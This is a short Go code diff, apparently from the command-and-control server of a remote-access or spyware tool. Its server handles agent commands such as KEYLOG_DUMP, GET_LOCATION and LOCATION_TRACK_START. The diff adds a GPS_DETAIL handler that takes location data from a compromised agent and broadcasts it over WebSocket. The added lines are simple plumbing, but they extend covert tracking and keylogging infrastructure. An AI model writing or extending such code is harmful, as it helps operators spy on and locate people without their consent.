@@ -164,6 +164,15 @@ func (s *Server) BroadcastTunnelUpdate(host string, port int) {
     }
 }
 
+// ==================== GPS DETAIL HANDLER ====================
+
+func (s *Server) handleGPSDetail(agent *Agent, result map[string]interface{}) {
+    log.Printf("🛰️ GPS Detail from %s", agent.ID)
+    
+    // Broadcast ke WebSocket
+    BroadcastGPSStatus(agent.ID, result)
+}
+
 func (s *Server) Stop() {
     s.running = false
     if s.listener != nil {
@@ -727,6 +736,10 @@ if cmdType == "KEYLOG_DUMP" {
     case "GET_LOCATION":
         s.handleLocation(agent, result)
         BroadcastResponse(agent.ID, cmdType, result)
+        
+    case "GPS_DETAIL":
+    s.handleGPSDetail(agent, result)
+    BroadcastResponse(agent.ID, cmdType, result)
         
     case "LOCATION_TRACK_START":
     s.handleLocationTrackStart(agent, result)
